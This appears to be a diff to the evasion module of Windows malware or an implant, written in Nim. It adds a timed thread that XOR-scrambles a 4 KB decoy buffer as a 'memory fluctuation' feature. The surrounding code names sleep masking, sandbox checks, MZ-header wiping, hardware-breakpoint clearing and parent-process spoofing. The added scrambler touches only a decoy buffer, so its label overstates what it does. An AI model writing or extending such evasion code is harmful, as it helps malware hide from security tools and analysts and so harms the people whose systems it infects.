@@ -231,6 +231,41 @@ when defined(windows):
     let waitMin = if cur < s: s - cur else: (24 * 60 - cur) + s
     if waitMin > 0: sleepMasked(waitMin * 60 * 1000)
 
+  # ── Memory scrambler daemon (MEM_FLUCTUATE) ───────────────────────────────────
+  const SCRAMBLE_KEY: byte = 0xA7
+  var gScramblerStop: bool = false
+  var gScramblerThread: Thread[int]
+  var gScramblerRunning: bool = false
+  # 4 KB decoy buffer that gets XOR-mutated on each tick
+  var gScramblerBuf: array[4096, byte]
+
+  proc scramblerThreadProc(intervalMs: int) {.thread.} =
+    var encrypted = false
+    while not gScramblerStop:
+      Sleep(DWORD(intervalMs))
+      if gScramblerStop: break
+      for i in 0..<gScramblerBuf.len:
+        gScramblerBuf[i] = gScramblerBuf[i] xor SCRAMBLE_KEY
+      encrypted = not encrypted
+    # Restore on exit
+    if encrypted:
+      for i in 0..<gScramblerBuf.len:
+        gScramblerBuf[i] = gScramblerBuf[i] xor SCRAMBLE_KEY
+
+  proc stopMemFluctuate*() =
+    if not gScramblerRunning: return
+    gScramblerStop = true
+    joinThread(gScramblerThread)
+    gScramblerRunning = false
+    gScramblerStop = false
+
+  proc startMemFluctuate*(intervalSec: int) =
+    stopMemFluctuate()
+    let ms = max(1, intervalSec) * 1000
+    gScramblerStop = false
+    createThread(gScramblerThread, scramblerThreadProc, ms)
+    gScramblerRunning = true
+
   # ── Apply all evasion at startup ──────────────────────────────────────────────
   proc applyEvasion*() =
     when defined(SandboxChecks):
@@ -285,3 +320,5 @@ else:
   proc wipeMZHeader*()   = discard
   proc clearHWBP*()      = discard
   proc spawnWithPPID*(cmd: string; ppidProc: string = "explorer.exe"): bool = false
+  proc startMemFluctuate*(intervalSec: int) = discard
+  proc stopMemFluctuate*()                  = discard
